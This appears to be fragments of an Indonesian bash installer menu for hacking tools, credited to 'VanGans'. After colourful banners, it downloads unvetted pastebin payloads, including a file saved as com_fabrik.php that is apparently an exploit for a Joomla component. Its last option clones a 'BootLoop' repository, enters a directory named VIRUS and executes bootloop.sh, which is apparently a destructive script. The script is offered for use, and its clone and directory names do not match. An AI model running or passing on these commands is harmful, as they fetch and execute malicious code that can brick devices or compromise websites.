...
echo  "[AUTHOR    : VanGans] " |lolcat
echo  "[NOTES     : JELAJAHI SETIAP TOOLS DENGAN BIJAK] " | lolcat
echo  "[THANKS    : All My Friends]" | lolcat
echo  "_____________________________________________________________" | lolcat
...
ctrl_c() {
clear
echo  $green"TOOLS NYA SUDAH ADA DI DIRECTORY -_- " |lolcat
sleep 1
echo  $green"Hargai Karya Orang Lain Cvk :v" |lolcat

echo  $green"See you Again:)..." |lolcat
echo  $green"Jangan pernah berhenti ketika kamu"
echo  $green"masih belum ingin menyerah,"
echo  $green"Selalu tanamkan dalam pikiranmu,"
echo  $green"bahwa dirimu harus terus berjalan tanpa henti."
figlet VanGans | lolcat
sleep 1
exit
}
...
echo  "#################################" | lolcat
echo  "#SILAHKAN TUNGGU LIST TOOLS NYA #" | lolcat
echo  "#################################" | 
lolcat

echo ""                
echo  "TOOLS INI CUMAN UNTUK MENGINSTALLNYA SAJA" |lolcat
echo  "MAU MENJALANKAN/MENGETAHUI TOOLS YANG KALIAN INSTALL" | lolcat
echo  "SILAHKAN KETIK 00 LALU KETIK ls" | lolcat
echo  "DAN MASUK KE TOOLS YANG KALIAN INSTALL" | lolcat
echo  "DONE KAN" | lolcat
echo  "SABAR NUNGGU JODOH YANG MASIH KESASAR :v " | lolcat
echo ""
...
mkdir webdav
cd webdav
wget https://pastebin.com/raw/WzKRbai0
...
399) wget https://pastebin.com/raw/cS8v3icQ -O com_fabrik.php
...
402) git clone https://github.com/Lamer1337Crew/BootLoop
cd VIRUS
chmod +x bootloop.sh
sh bootloop.sh
